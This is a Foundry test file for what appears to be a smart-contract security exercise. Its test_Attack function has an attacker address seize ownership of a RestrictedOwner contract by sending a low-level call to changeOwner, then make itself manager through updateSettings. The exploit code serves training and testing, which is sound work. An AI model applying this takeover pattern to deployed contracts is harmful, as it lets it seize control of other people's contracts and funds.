// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {UnrestrictedOwner} from "src/call-attacks-1/UnrestrictedOwner.sol";
import {RestrictedOwner} from "src/call-attacks-1/RestrictedOwner.sol";

contract CATest1 is Test {
    UnrestrictedOwner unrestrictedOwner;
    RestrictedOwner restrictedOwner;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(deployer, 100 ether);
        vm.deal(user, 100 ether);
        vm.deal(attacker, 100 ether);

        vm.startPrank(deployer);
        unrestrictedOwner = new UnrestrictedOwner();
        restrictedOwner = new RestrictedOwner(address(unrestrictedOwner));
        vm.stopPrank();
    }

    function test_Attack() public {
        assertEq(restrictedOwner.owner(), deployer);
        vm.startPrank(attacker);
        bytes memory data = abi.encodeWithSignature("changeOwner(address)", attacker);
        (bool success, ) = address(restrictedOwner).call(data);
        assertEq(restrictedOwner.owner(), attacker);
        assertNotEq(restrictedOwner.manager(), attacker);
        restrictedOwner.updateSettings(attacker, attacker);
        assertEq(restrictedOwner.manager(), attacker);
        vm.stopPrank();
    }
}